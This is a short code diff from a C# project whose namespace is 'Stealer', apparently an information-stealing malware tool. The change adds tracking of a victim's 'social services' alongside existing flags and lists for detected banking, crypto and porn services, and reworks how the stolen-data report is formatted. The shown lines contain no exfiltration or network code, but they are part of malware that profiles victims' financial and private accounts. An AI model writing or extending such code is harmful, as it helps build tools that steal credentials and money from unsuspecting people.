@@ -38,9 +38,11 @@ namespace Stealer
         public static bool BankingServices = false;
         public static bool CryptoServices = false;
         public static bool PornServices = false;
+        public static bool SocialServices = false;
         public static List<string> DetectedBankingServices = new List<string>();
         public static List<string> DetectedCryptoServices = new List<string>();
         public static List<string> DetectedPornServices = new List<string>();
+        public static List<string> DetectedSocialServices = new List<string>();
 
         // Get string value
         public static string GetSValue(string application, bool value)
@@ -58,8 +60,8 @@ namespace Stealer
         public static string GetLValue(string application, List<string> value, char separator = '∟')
         {
             value.Sort(); // Sort list items
-            return value.Count != 0 ? "\n   ∟ " + application + ":\n\t\t\t\t\t\t\t" + separator + " " +
-                string.Join("\n\t\t\t\t\t\t\t" + separator + " ", value) : "\n   ∟ " + application + " (No data)";
+            return value.Count != 0 ? "\n   " + separator + " " + application + ":\n\t\t\t\t\t\t\t" + separator + " " +
+                string.Join("\n\t\t\t\t\t\t\t" + separator + " ", value) : "\n   " + separator + " " + application + " (No data)";
         }
 
         // Get boolean value
